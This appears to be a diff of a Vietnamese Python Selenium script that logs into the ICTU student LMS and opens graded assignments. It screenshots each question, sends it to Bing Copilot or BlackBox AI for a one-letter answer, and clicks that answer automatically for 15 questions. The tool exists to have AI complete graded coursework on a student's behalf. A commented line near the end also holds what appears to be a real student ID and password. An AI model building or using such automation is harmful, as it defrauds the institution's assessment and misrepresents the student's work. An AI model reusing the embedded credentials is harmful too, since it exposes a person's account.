+
+def autoDoiPhanTuHienThi_XPATH(boXuLy, thoiGianXuLy, xPath):
+    return WebDriverWait(boXuLy, thoiGianXuLy).until(
+        EC.visibility_of_element_located((By.XPATH, xPath))
+    )
+
+
+def autoDoiPhanTuHienThi_CSS_SELECTOR(boXuLy, thoiGianXuLy, cssSelector):
+    return WebDriverWait(boXuLy, thoiGianXuLy).until(
+        EC.visibility_of_element_located((By.CSS_SELECTOR, cssSelector))
+    )
+
+
+""" Hàm LOGIN"""
+
+
+# Login LMS
+def LoginLMS(usernameLog, passwordLog):
+    ChuyenTab1()
+    driver.get("https://lms.ictu.edu.vn/dashboard/classes")
+
+    try:
+        tenTaiKhoan = autoKhiPhanTuCoTheClickDuoc_ID(driver, 20, "mat-input-0")
+        tenTaiKhoan.send_keys(usernameLog + "@ictu.edu.vn")  # tk
+
+        matKhau = autoKhiPhanTuCoTheClickDuoc_ID(driver, 20, "mat-input-1")
+        matKhau.send_keys(passwordLog)  # mk
+
+        dangNhap = autoKhiPhanTuCoTheClickDuoc_CLASS_NAME(driver, 20, "grid")
+        dangNhap.click()  # click đăng nhập
+    except:
+        pass
+
+    try:
+        xacNhanDangNhapThanhCong = autoDoiPhanTuHienThi_CSS_SELECTOR(
+            driver, 10, ".header-button__feature__node"
+        )
+        name = autoDoiPhanTuHienThi_CSS_SELECTOR(driver, 10, "h6")
+        id = autoDoiPhanTuHienThi_CSS_SELECTOR(driver, 10, "small")
+        if xacNhanDangNhapThanhCong.text == "LỚP HỌC PHẦN":
+            os.system("cls")
+            for i in range(3, 0, -1):
+                print(Fore.GREEN + f"[PHẢN HỒI]: Đăng nhập thành công [ID: {id.text}]")
+                print(f"Xin chào {Fore.LIGHTWHITE_EX}{name.text}")
+                print(f"[VUI LÒNG ĐỢI {i} GIÂY]")
+                sleep(1)
+                os.system("cls")
+    except:
+        os.system("cls")
+        for i in range(3, 0, -1):
+            print(Fore.RED + "[LỖI]: Đăng nhập thất bại!!")
+            print(f"[TỰ ĐỘNG THOÁT SAU {i} GIÂY]")
+            sleep(1)
+            os.system("cls")
+        # os.system()
+        exit()
+
+    # Dang nhap xong
+
+
+# Nhap Hashcode
+def NhapHashcodeVaLamBai():
+    os.system("cls")
+    #
+    print("Nhập Hashcode cho bài cần làm (Chưa biết lấy hãy xem trong hướng dẫn):")
+    hashcode = input("[HASHCODE]: ")
+
+    ChuyenTab1()
+    driver.get(f"https://lms.ictu.edu.vn/assignment/weekly?hashcode={hashcode}")
+    # test()
+
+    try:
+        checkbox = autoDoiPhanTuHienThi_CSS_SELECTOR(
+            driver, 10, ".p-checkbox-label"
+        ).click()  # checkbox
+
+        batDauLam = autoDoiPhanTuHienThi_CSS_SELECTOR(
+            driver, 2, ".p-button-label"
+        ).click()  # làm bài
+    except:
+        os.system("cls")
+        for i in range(4, 0, -1):
+            print(
+                Fore.RED
+                + "[LỖI]: Hashcode không hợp lệ hoặc có thể đã hết hạn. Vui lòng kiểm tra lại hướng dẫn để biết thêm thông tin và thử lại sau nhé!"
+            )
+            print(f"[HÃY THỬ LẠI SAU {i} GIÂY]")
+            sleep(1)
+            os.system("cls")
+        NhapHashcodeVaLamBai()
+
+
+# Login BingAI
+def LoginBingAI():
+    ### Đăng nhập
+    driver.execute_script("window.open('');")  # motap2
+    # driver.switch_to.window(driver.window_handles[1])  # dieukhientap2
+    ChuyenTab2()
+    driver.get("https://copilot.microsoft.com")
+    print(
+        Fore.RED
+        + "[PHẢN HỒI]: Tool Auto không thể thực hiện được các bước xác minh này. Để đảm bảo an toàn và thành công \ntrong việc đăng nhập, bạn cần thực hiện bằng tay những bước xác minh tài khoản của MICROSOFT."
+    )
+    print(
+        "- - - - - - - - - - - - - - - - - - -* * * - - - - - - - - - - - - - - - - - - -"
+    )
+    xacNhan = input("[ẤN ENTER NẾU BẠN ĐĂNG NHẬP THÀNH CÔNG]...")
+
+
+def LoginBlackBoxAI():
+    driver.execute_script("window.open('');")  # motap2
+    # ChuyenTab2()
+    # driver.get("https://www.blackbox.ai/")
+
+
+"""Hàm Xử Lý Làm Bài"""
+
+"""======================================== [QUÁ TRÌNH LÀM BÀI] ========================================"""
+
+
+# chon đáp án
+def ChonDapAnVaChuyenCauHoi(cauSo, cauTraLoi):
+    # test()
+    ChuyenTab1()
+    # Tính toán chỉ số CSS Selector dựa trên số câu hỏi
+    codeCauTraLoi = 2 + (cauSo - 1) * 4  # trích xuất css_selector từ câu hỏi
+    dapAnA = f"#mat-radio-{codeCauTraLoi} .mdc-label"
+    dapAnB = f"#mat-radio-{codeCauTraLoi + 1} .mdc-label"
+    dapAnC = f"#mat-radio-{codeCauTraLoi + 2} .mdc-label"
+    dapAnD = f"#mat-radio-{codeCauTraLoi + 3} .mdc-label"
+    # chọn a b c d
+    if cauTraLoi == "A" or cauTraLoi == "a" or cauTraLoi == "1":
+        ChonDapAn = autoDoiPhanTuHienThi_CSS_SELECTOR(driver, 300, dapAnA)
+        ChonDapAn.click()
+    elif cauTraLoi == "B" or cauTraLoi == "b" or cauTraLoi == "2":
+        ChonDapAn = autoDoiPhanTuHienThi_CSS_SELECTOR(driver, 300, dapAnB)
+        ChonDapAn.click()
+    elif cauTraLoi == "C" or cauTraLoi == "c" or cauTraLoi == "3":
+        ChonDapAn = autoDoiPhanTuHienThi_CSS_SELECTOR(driver, 300, dapAnC)
+        ChonDapAn.click()
+    elif cauTraLoi == "D" or cauTraLoi == "d" or cauTraLoi == "4":
+        ChonDapAn = autoDoiPhanTuHienThi_CSS_SELECTOR(driver, 300, dapAnD)
+        ChonDapAn.click()
+    else:
+        pass
+        # Bạn hoàn thiện giúp tôi nếu không chọn được đáp án thì gọi lại hàm tracuuBingAI ra để gọi lại
+    # bấm câu hỏi tiếp theo
+    cauHoiTiepTheo = autoDoiPhanTuHienThi_CSS_SELECTOR(
+        driver, 30, ".ictu-page-test__test-panel__single-nav__btn-control"
+    )
+    cauHoiTiepTheo.click()
+
+
+# chụp màn hình câu hỏi hiện tại, dán vào là chụp tap đó
+def ChupManHinhCauHoiHienTai(cauHoiHienTai):
+    setTime = time.localtime()
+
+    ChuyenTab1()
+    # test()
+    sleep(2)
+    tep = f"{setTime.tm_min}_{cauHoiHienTai}.png"
+    tep1 = f"{setTime.tm_min}_{cauHoiHienTai}(1).png"
+    tep2 = f"{setTime.tm_min}_{cauHoiHienTai}(2).png"
+    tep3 = f"{setTime.tm_min}_{cauHoiHienTai}(3).png"
+
+    # nếu tẹp trùng
+    if os.path.exists(tep):  # nếu tệp tồn tại thì thêm số đằng sau
+        driver.save_screenshot(tep1)
+        return tep1
+    if os.path.exists(tep1):
+        driver.save_screenshot(tep2)
+        return tep2
+    if os.path.exists(tep2):
+        driver.save_screenshot(tep3)
+        return tep3
+    # Nếu không có tệp trùng trả về text câu hỏi hiện tại là bao nhiêu
+    driver.save_screenshot(tep)
+    return tep
+
+
+# tra con chat bing - return câu trả lời khi AI trả lời
+def TraCuuBingAI(fileCanUpload, khongTimDuocCauTraLoi=0, max_attempts=3):
+    ChuyenTab2()
+    driver.refresh()
+    # test()
+    # giới hạn số lần thử để tránh vòng lặp vô hạn
+    if khongTimDuocCauTraLoi >= max_attempts:
+        return (
+            Fore.RED
+            + "[LỖI]: Đã thử nhiều lần nhưng không nhận được câu trả lời hợp lệ."
+        )
+
+    try:
+        # upload file len bing
+        upAnh = autoDoiPhanTuHienThi_CSS_SELECTOR(
+            driver, 30, ".relative:nth-child(2) > .absolute .size-6"
+        )
+        upAnh.click()
+        sleep(2)
+        upload_file(fileCanUpload)
+
+        # gửi yêu cầu trả lời
+        userInput = autoDoiPhanTuHienThi_ID(driver, 30, "userInput")
+        userInput.click()
+        userInput.send_keys(
+            "Vui lòng chú ý cau hỏi trong ảnh mà tôi gửi và chỉ trả lời duy nhất một ký tự đại diện cho đáp án chính xác (A, B, C hoặc D). Không thêm bất kỳ văn bản nào khác hoặc ký tự nào khác vào câu trả lời. Chỉ xuất ra duy nhất ký tự."
+        )
+        userInput.send_keys(Keys.SHIFT, Keys.ENTER)
+
+        userInput.send_keys(
+            "Tôi rõ ràng đã bảo là quan sát kỹ ảnh, chỉ trả lời đúng một ký tự: A, B, C hoặc D. Không thêm văn bản thừa. Không thêm bất kỳ từ ngữ hoặc dấu câu nào khác (Không thêm dấu chấm đằng sau nha ví dụ: B. (không hợp lệ)). Chỉ xuất ra đúng một ký tự."
+        )
+
+        # click gui
+        send = autoDoiPhanTuHienThi_CSS_SELECTOR(
+            driver, 30, ".text-foreground-800 > .size-6"
+        )
+        sleep(2.5)
+        send.click()
+
+        sleep(2.5)
+
+        # lay cau tra loi
+        answer = autoDoiPhanTuHienThi_CSS_SELECTOR(
+            driver, 30, ".space-y-3:nth-child(2) > .space-y-3 span"
+        )
+        cauTraLoi = answer.text.strip()
+
+        # xcheck xem cau hoi hop le chua
+        if cauTraLoi in ["A", "B", "C", "D"]:
+            return cauTraLoi
+        else:
+            khongTimDuocCauTraLoi += 1
+            print(
+                Fore.RED
+                + f"[LỖI]: Câu trả lời không hợp lệ, thử lại lần {khongTimDuocCauTraLoi}..."
+            )
+            return TraCuuBingAI(fileCanUpload, khongTimDuocCauTraLoi, max_attempts)
+
+    except Exception as e:
+        print(
+            Fore.RED
+            + f"[LỖI]: Ơ có lỗi gì thế nhỉ, bạn đăng nhập thành công BingAI chưa, phải đăng nhập mới làm được nhé^^"
+        )
+        return TraCuuBingAI(fileCanUpload, khongTimDuocCauTraLoi + 1, max_attempts)
+
+    # searchbox = autoDoiPhanTuHienThi_CSS_SELECTOR(driver, 30, "searchbox")
+    # searchbox.send_keys(
+    #     "Bạn chỉ cần hiện thị đáp án không cần hiện thị câu trả lời ví dụ: \nCâu hỏi: 1+1 = ?\nA.1\nB.2\nC.3\nD.4\nBạn chỉ cần trả lời là : A (không có kí tự gì đằng sau)\n---"
+    #     + cauHoi
+    # )
+
+
+def test():
+    c = input("testing to ok: ")
+
+
+def TraCuuBlackBoxAI(fileCanUpload, khongTimDuocCauTraLoi=0, max_attempts=3):
+    ChuyenTab2()
+    driver.get("https://www.blackbox.ai/")
+
+    # driver.get("https://www.blackbox.ai/")
+    if khongTimDuocCauTraLoi >= max_attempts:
+        return (
+            Fore.RED
+            + "[LỖI]: Đã thử nhiều lần nhưng không nhận được câu trả lời hợp lệ."
+        )
+    try:  #:
+        clickDeUpFile = autoDoiPhanTuHienThi_XPATH(
+            driver,
+            30,
+            "/html/body/div[2]/main/div/div[2]/div/div/div/div/div[2]/div/div[2]/div/div/form/div[4]/div[1]/div[3]",
+        ).click()
+
+        clickDeUpFile2 = autoDoiPhanTuHienThi_CSS_SELECTOR(
+            driver, 30, ".cursor-default:nth-child(1)"
+        ).click()
+        sleep(2)
+        upload_file(fileCanUpload)
+
+        input = autoDoiPhanTuHienThi_ID(driver, 30, "chat-input-box")
+        input.click()
+        input.send_keys(
+            "@Gemini-PRO "
+            + "Vui lòng chú ý cau hỏi trong ảnh mà tôi gửi và chỉ trả lời duy nhất một ký tự đại diện cho đáp án chính xác (A, B, C hoặc D). Không thêm bất kỳ văn bản nào khác hoặc ký tự nào khác vào câu trả lời. Chỉ xuất ra duy nhất ký tự."
+        )
+        input.send_keys(Keys.SHIFT, Keys.ENTER)
+        input.send_keys(
+            "Tôi rõ ràng đã bảo là quan sát kỹ ảnh, chỉ trả lời đúng một ký tự: A, B, C hoặc D. Không thêm văn bản thừa. Không thêm bất kỳ từ ngữ hoặc dấu câu nào khác (Không thêm dấu chấm đằng sau nha ví dụ: B. (không hợp lệ)). Chỉ xuất ra đúng một ký tự."
+        )
+        sleep(1)
+        # send
+
+        # pyautogui.press("enter")
+        input.send_keys(Keys.ENTER)
+
+        nhanCauTraLoi = autoDoiPhanTuHienThi_CSS_SELECTOR(
+            driver, 30, ".prose:nth-child(3) > .mb-2"
+        )
+        answer = nhanCauTraLoi.text
+        cauTraLoi = answer.strip()
+        # print(cauTraLoi)
+        # xcheck xem cau hoi hop le chua
+        if cauTraLoi in ["A", "B", "C", "D"]:
+            return cauTraLoi
+        else:
+            khongTimDuocCauTraLoi += 1
+            print(
+                Fore.RED
+                + f"[LỖI]: Câu trả lời không hợp lệ, thử lại lần {khongTimDuocCauTraLoi}..."
+            )
+            return TraCuuBlackBoxAI(fileCanUpload, khongTimDuocCauTraLoi, max_attempts)
+    except Exception as e:
+        print(Fore.RED + f"[LỖI]: {e} Có một vài lỗi tại BlackBoxAI bạn hãy thử lại^^")
+        return TraCuuBlackBoxAI(fileCanUpload, khongTimDuocCauTraLoi + 1, max_attempts)
+
+
+""" =================================== [THỰC THI LÀM BÀI] ===================================="""
+
+
+def QuaTrinhLamBai():  # BẢN DÀNH CHO BINGAI -------------- BINGAI
+    cauSo = 0  # khoitao
+    cauTraLoi = ""  # khoitao
+    print(
+        "===================================== [PHẢN HỒI] ====================================="
+    )
+    while True:
+        if cauSo == 15:
+            break
+        else:
+            cauSo += 1  # tăng câu hỏi mỗi lần hoàn thành, lần đầu sẽ = 1
+            fileCauHoi = ChupManHinhCauHoiHienTai(cauSo)  # lấy file câu hỏi
+            sleep(1)
+            cauTraLoi = TraCuuBingAI(fileCanUpload=fileCauHoi)  # tra cứu câu hỏi đó
+            sleep(1)
+            ChonDapAnVaChuyenCauHoi(cauSo, cauTraLoi)
+            sleep(1)
+            print(Fore.GREEN + f"---> [HOÀN THÀNH]: CÂU {cauSo} | Đáp án {cauTraLoi}")
+
+
+def QuaTrinhLamBai_2():  # BẢN DÀNH CHO BLACKBOX -------------- BLACKBOX
+    cauSo = 0  # khoitao
+    cauTraLoi = ""  # khoitao
+    print(
+        "===================================== [PHẢN HỒI] ====================================="
+    )
+    while True:
+        if cauSo == 15:
+            break
+        else:
+            cauSo += 1  # tăng câu hỏi mỗi lần hoàn thành, lần đầu sẽ = 1
+            fileCauHoi = ChupManHinhCauHoiHienTai(cauSo)  # lấy file câu hỏi
+            sleep(1)
+            cauTraLoi = TraCuuBlackBoxAI(fileCanUpload=fileCauHoi)  # tra cứu câu hỏi đó
+            sleep(1)
+            ChonDapAnVaChuyenCauHoi(cauSo, cauTraLoi)
+            sleep(1)
+            print(Fore.GREEN + f"---> [HOÀN THÀNH]: CÂU {cauSo} | Đáp án {cauTraLoi}")
+
+
+# Thực thi bản BingAI    BINGAI---------------
+def ThucThi_1(usern, passw):
+    LoginLMS(usernameLog=usern, passwordLog=passw)
+    LoginBingAI()
+    NhapHashcodeVaLamBai()
+    QuaTrinhLamBai()
+    print(
+        "----------------------------------------------------------------------------------------------------------------------------------------"
+    )
+    print(
+        Fore.GREEN
+        + "[PHẢN HỒI]: ^^ Mình làm xong cho bạn rồi, nhưng mình sợ bạn không tin tưởng mình \ncho nên mình để bạn tự kiểm tra lại rồi bấm NỘP BÀI đó!!"
+    )
+    tatTrinhDuyet = input("->[Gõ ENTER để thoát trình duyệt]...")
+    driver.quit()
+
+
+# Thực thi bản BlackBox BLACKBOX-----
+def ThucThi_2(usern, passw):
+    LoginLMS(usernameLog=usern, passwordLog=passw)
+    # LoginBingAI()
+    LoginBlackBoxAI()
+    NhapHashcodeVaLamBai()
+    QuaTrinhLamBai_2()
+    print(
+        "----------------------------------------------------------------------------------------------------------------------------------------"
+    )
+    print(
+        Fore.GREEN
+        + "[PHẢN HỒI]: ^^ Mình làm xong cho bạn rồi, nhưng mình sợ bạn không tin tưởng mình \ncho nên mình để bạn tự kiểm tra lại rồi bấm NỘP BÀI đó!!"
+    )
+    tatTrinhDuyet = input("->[Gõ ENTER để thoát trình duyệt]...")
+    driver.quit()
+
+
+os.system("cls")
+# làm đẹp
+init(autoreset=True)  # cái này để không bị lặp màu, tha hồ tùy chỉnh
+
+print(
+    f"{Fore.BLUE + Style.BRIGHT} - - - - - - - - - - - -  [DEMO TOOL AUTO LÀM BÀI TẬP LMS (BETA 1.0) - DUCANHWORK26] - - - - - - - - - - - - "
 )
+print(
+    f"{Fore.CYAN}[THÔNG BÁO]: {Fore.CYAN}Để đảm bảo kết quả bài kiểm tra của bạn đạt được hiệu quả tốt nhất, công cụ sẽ tự động hoàn thành đến câu hỏi số 15. \nSau đó, bạn sẽ có cơ hội tự kiểm tra và điều chỉnh trước khi nộp bài."
+)
+print(
+    "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -"
+)
+usern = input(f" {Fore.LIGHTWHITE_EX}Mã sinh viên [LMS/ICTU]: ")
+passw = getpass.getpass(
+    f" {Fore.LIGHTWHITE_EX}Mật khẩu [LMS/ICTU](tàng hình ghi nhập): "
+)
+chrome_option = Options()
+chrome_option.add_argument("--log-level=3")  # Tắt log từ Selenium
+chrome_option.add_argument("--silent")  # Giảm thiểu các thông báo không cần thiết
+# chrome_option.add_argument(
+#     "user-data-dir=A:\Lap_trinh_py\RenLuyenSeleniumPython\Toollms\q"
+# )  # saveprofile
+driver = webdriver.Chrome(options=chrome_option)
+# LoginBlackBoxAI()
+# TraCuuBlackBoxAI("Test2.png")
+ThucThi_2(usern=usern, passw=passw)
+
+# tab = driver.window_handles
+# LoginLMS("DTC225201447", "24102004")
+# NhapHashcodeVaLamBai()
